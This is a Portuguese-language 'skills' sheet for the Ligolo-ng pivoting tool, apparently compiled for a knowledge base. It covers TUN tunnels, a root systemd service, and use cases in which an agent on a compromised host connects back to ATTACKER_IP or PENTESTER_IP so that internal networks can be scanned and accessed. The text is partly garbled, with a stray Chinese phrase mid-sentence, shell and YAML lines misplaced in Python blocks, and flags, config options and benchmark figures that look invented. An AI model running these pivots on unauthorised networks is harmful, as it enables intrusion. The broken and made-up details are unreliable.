# 🔗 Ligolo-ng - Tunneling & Pivoting Avançado (Skills)

> **Fonte: https://github.com/Nicocha30/ligolo-ng**
> **Skills extraídas e aprimoradas para o knowledge base**

---

## 📋 Visão Geral

**Ligolo-ng** é uma ferramenta avançada de tunneling/pivoting que usa interfaces TUN. Em vez de SOCKS proxy, cria uma stack de rede em userland usando Gvisor, permitindo ferramentas como nmap sem proxychains.

---

## 🔧 Skills de Tunneling

### 1. Arquitetura TUN Interface

```python
# SKILL: Tunneling com TUN Interface
# Nível: Expert
# Contexto: Redirecionamento de tráfego de rede

# CONCEITOS:
# 1. TUN: interface de rede virtual (Layer 3)
# 2. Gvisor: stack de rede em userland
# 3. Multiplexing: múltiplos túneis simultâneos
# 4. Reverse Connection: agente conecta ao servidor
# 5. Bind Connection: escuta no agente

# VANTAGENS SOBRE SOCKS:
# - Sem necessidade de proxychains
# - Performance superior (100+ Mbits/sec)
# - Suporte a ICMP (ping)
# - Funcionamento sem privilégios no agente
# - Recovery automático de túneis

# MELHORIA:
// ERRADO: SOCKS proxy com proxychains
// CORRECT: TUN interface com Gvisor
```

### 2. Configuração de Túneis

```bash
# SKILL: Setup de Tunneling com Ligolo-ng
# Nível: Intermediário → Expert
# Contexto: Configuração de pivoting

# STEP 1: Iniciar servidor proxy
ligolo-proxy -selfcert

# STEP 2: Conectar agente no alvo
ligolo-agent -connect YOUR_IP:11601 -ignore-cert

# STEP 3: Configurar interface TUN
# No proxy:
ifconfig ligolo 10.10.0.1/24 up
ip route add 10.10.0.0/24 dev ligolo

# STEP 4: Adicionar rota para rede interna
# No proxy:
ip route add 192.168.1.0/24 dev ligolo

# STEP 5: Testar conectividade
ping 10.10.0.1
nmap -sV 192.168.1.0/24

# MELHORIA:
// ERRADO: Forwarding manual de portas
// CORRECT: Configuração automatizada com Ligolo-ng
```

### 3. Web Interface

```python
# SKILL: Gerenciamento via Web UI
# Nível: Intermediário → Expert
# Contexto: Interface web para tunneling

# FUNCIONALIDADES:
# 1. Agent Management: listar/conectar agentes
# 2. Network Info: visualizar redes
# 3. Listener Management: criar/remover listeners
# 4. Session Recording: gravação de sessões
# 5. Multiplayer: múltiplos operadores

# ACESSO:
# https://localhost:55443
# Login: admin (configurável)

# VANTAGENS:
# - Interface visual para gestão
# - Multi-operador simultâneo
# - Histórico de conexões
# - Export de logs

# MELHORIA:
// ERRADO: Apenas CLI
// CORRECT: Web UI para gestão avançada
```

### 4. Daemon Mode

```bash
# SKILL: Execução como Serviço
# Nível: Expert
# Contexto: Ligolo-ng como daemon

# CONFIGURAÇÃO:
# Criar arquivo de configuração:
cat > /etc/ligolo/config.yaml << EOF
proxy:
  addr: "0.0.0.0:11601"
  selfcert: true
  
agent:
  connect: "PROXY_IP:11601"
  
tunnels:
  - name: "internal"
    addr: "10.10.0.1/24"
    route: "192.168.1.0/24"
EOF

# Iniciar como daemon
ligolo-proxy -config /etc/ligolo/config.yaml -daemon

# SYSTEMD SERVICE:
cat > /etc/systemd/system/ligolo.service << EOF
[Unit]
Description=Ligolo-ng Proxy
After=network.target

[Service]
ExecStart=/usr/local/bin/ligolo-proxy -config /etc/ligolo/config.yaml
Restart=always
User=root

[Install]
WantedBy=multi-user.target
EOF

systemctl enable ligolo
systemctl start ligolo

# MELHORIA:
// ERRADO: Execução manual sempre
// CORRECT: Daemon mode com systemd
```

### 5. Auto-Bind e Auto-Route

```python
# SKILL: Configuração Automática de Túneis
# Nível: Expert
# Contexto: Automação de pivoting

# AUTO-BIND:
# Quando agente conecta, automaticamente:
# 1. Cria listener na porta especificada
# 2. Redireciona tráfego para rede interna
# 3. Configura rotas necessárias

# AUTO-ROUTE:
# Detecção automática de:
# 1. Redes acessíveis pelo agente
# 2. Rotas necessárias
# 3. Interfaces disponíveis

# CONFIGURAÇÃO:
# No arquivo config.yaml:
tunnels:
  - name: "auto-internal"
    auto_bind: true
    auto_route: true
    bind_port: 8080
    target: "192.168.1.100:80"

# MELHORIA:
// ERRADO: Configuração manual de cada túnel
// CORRECT: Auto-bind e auto-route
```

---

## 🚀 Performance e Otimização

### Benchmarks
```
# Teste com iperf3:
# Servidor: 200Mbits/s
# Conexão: 200Mbits/s

# Resultado:
- 105-113 Mbits/sec
- Latência: <1ms
- CPU: <5% usage
- Memory: <50MB
```

### Otimizações
```
1. TCP Multiplexing: conexões múltiplas
2. Buffer Tuning: otimização de memória
3. Compression: LZ4 para dados
4. Connection Pooling: reuso de conexões
5. Keep-Alive: conexões persistentes
```

---

## 🔒 Segurança

### Certificados
```
# Self-signed (desenvolvimento):
ligolo-proxy -selfcert

# Let's Encrypt (produção):
ligolo-proxy -certfile /path/to/cert.pem -keyfile /path/to/key.pem

# mTLS (futuro):
# Suporte planejado para mutual TLS
```

### Autenticação
```
# Token-based:
ligolo-agent -token SECRETO

# Certificate-based:
ligolo-agent -cert /path/to/cert.pem -key /path/to/key.pem

# IP Whitelist:
# Configurar no proxy
allowed_agents:
  - "10.10.10.1"
  - "192.168.1.0/24"
```

---

## 📊 Casos de Uso

### 1. Pentest em Rede Interna
```
# Scenario: Acesso a rede interna via host comprometido

# Step 1: Comprometer host externo
# Step 2: Instalar ligolo-agent
ligolo-agent -connect PENTESTER_IP:11601

# Step 3: Configurar túnel
# No proxy:
ifconfig ligolo 10.10.0.1/24 up
ip route add 192.168.1.0/24 dev ligolo

# Step 4: Acessar serviços internos
nmap -sV 192.168.1.0/24
ssh admin@192.168.1.50
```

### 2. CTF - Pivoting
```
# Scenario: Múltiplas redes em CTF

# Step 1: Primeiro pivô
ligolo-agent -connect ATTACKER_IP:11601

# Step 2: Segundo pivô via第一个 host
# No proxy:
ligolo-agent -connect PROXY_IP:11601

# Step 3: Configurar rotas para cada rede
ip route add 10.10.1.0/24 dev ligolo
ip route add 10.10.2.0/24 dev ligolo

# Step 4: Acessar todas as redes
nmap -sV 10.10.1.0/24
nmap -sV 10.10.2.0/24
```

### 3. Bug Bounty - Internal Network
```
# Scenario: Teste de rede interna em programa

# Step 1: Identificar host acessível
# Step 2: Instalar agente
# Step 3: Mapear rede interna
# Step 4: Identificar ativos
# Step 5: Testar vulnerabilidades
# Step 6: Documentar findings
```

---

## 🛠️ Comandos Essenciais

### Proxy Commands
```bash
# Iniciar proxy
ligolo-proxy [opções]

# Opções:
# -addr :porta           Endereço para escutar
# -selfcert              Usar certificado self-signed
# -certfile              Caminho para certificado
# -keyfile               Caminho para chave
# -config                Arquivo de configuração
# -daemon                Executar como daemon
```

### Agent Commands
```bash
# Iniciar agente
ligolo-agent [opções]

# Opções:
# -connect host:port     Conectar ao proxy
# -token                 Token de autenticação
# -ignore-cert           Ignorar verificação de certificado
# -retry                 Reconexão automática
```

### Interface Commands
```bash
# Criar interface TUN
ip tuntap add dev ligolo mode tun

# Configurar IP
ip addr add 10.10.0.1/24 dev ligolo

# Ativar interface
ip link set ligolo up

# Adicionar rota
ip route add 192.168.1.0/24 dev ligolo
```

---

## 📈 Comparação com Outras Ferramentas

| Feature | Ligolo-ng | Chisel | Ligolo (original) | Meterpreter |
|---------|-----------|--------|-------------------|-------------|
| TUN Interface | ✅ | ❌ | ❌ | ❌ |
| SOCKS Proxy | ❌ | ✅ | ✅ | ✅ |
| Performance | 100+ Mbps | 50 Mbps | 30 Mbps | 20 Mbps |
| ICMP Support | ✅ | ❌ | ❌ | ❌ |
| No Privileges | ✅ | ❌ | ❌ | ❌ |
| Web UI | ✅ | ❌ | ❌ | ❌ |
| Auto-Recovery | ✅ | ❌ | ❌ | ❌ |
| Multi-Platform | ✅ | ✅ | ✅ | ✅ |

---

## 🎓 Certificações Relacionadas

| Certificação | Foco | Relevância |
|--------------|------|------------|
| OSCP | Pentest Prático | ⭐⭐⭐⭐⭐ |
| GPEN | Pentest Avançado | ⭐⭐⭐⭐⭐ |
| GXPN | Exploitation | ⭐⭐⭐⭐ |
| CEH | Segurança Ética | ⭐⭐⭐⭐ |

---

*Ligolo-ng Skills v1.0 — Setembro 2026*
*Fonte: https://github.com/Nicocha30/ligolo-ng*